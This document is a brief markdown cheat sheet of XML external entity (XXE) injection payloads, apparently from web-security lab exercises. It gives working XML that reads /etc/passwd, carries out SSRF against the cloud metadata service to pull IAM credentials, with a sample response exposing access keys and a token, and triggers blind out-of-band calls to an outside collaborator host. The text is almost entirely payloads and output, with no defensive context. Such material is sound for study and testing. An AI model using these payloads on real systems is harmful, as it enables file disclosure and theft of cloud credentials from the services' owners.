# XML external entity (XXE) injection

## Exploiting XXE using external entities to retrieve files
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

## Exploiting XXE to perform SSRF attacks
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Response:
```
HTTP/1.1 400 Bad Request
Content-Type: application/json
Connection: close
Content-Length: 546

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2019-12-04T10:39:48.174417Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "D7yHyaS5hANcoG9TRauJ",
  "SecretAccessKey" : "sjh5r5gtjQve7lX8O54ot3MdPlumGIIjiMseJ0C7",
  "Token" : "E6wskTuxF97EZqvoUbf9MiJigRSLPFzZIdIGXcE42TvUcNbDoPOWS4hORxQyw6AbJHVc5oKKuzA7jZqs4RBUH82sPaSbWAC0irnK38e7HPGrEa8LtXtPGhEbYn162TfasBvs1H7wOrDuV1iYykMb0vZEh0Oe6aqk0u4kbc2XmDRdUUmknShBqq4AVttL69qtTjsRQ4gzcbgMOC5rhDVHx01bTd9dHrt1XEAVxzBJY3Stj40s0nkAOyIvWCoKF68T",
  "Expiration" : "2025-12-02T10:39:48.174417Z"
}"
```

## Blind XXE vulnerabilities

### Blind XXE with out-of-band interaction
```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://burpcollaborator.net"> ]> 
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### Blind XXE with out-of-band interaction via XML parameter entities
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net"> %xxe; ]> 
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```